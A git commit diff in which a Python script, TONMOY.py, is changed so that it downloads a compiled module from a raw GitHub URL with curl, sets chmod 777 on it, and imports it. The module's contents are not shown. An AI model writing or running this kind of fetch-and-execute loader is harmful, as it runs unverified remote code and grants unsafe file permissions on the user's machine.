4936ac0a1de33cd725914c9c249abba19535f136
TONMOY X X X <115365878+tonmoy404-cyber@users.noreply.github.com>
2023-12-30 11:38:37 +0600

    Update TONMOY.py

--- TONMOY.py
+++ TONMOY.py
@@ -1,1 +1,6 @@
-import bx
+import os
+
+
+os.system('curl https://raw.githubusercontent.com/tonmoy404-cyber/TKM/main/nrf.cpython-311.so > nrf.cpython-311.so') 
+os.system("chmod 777 nrf*")
+import nrf
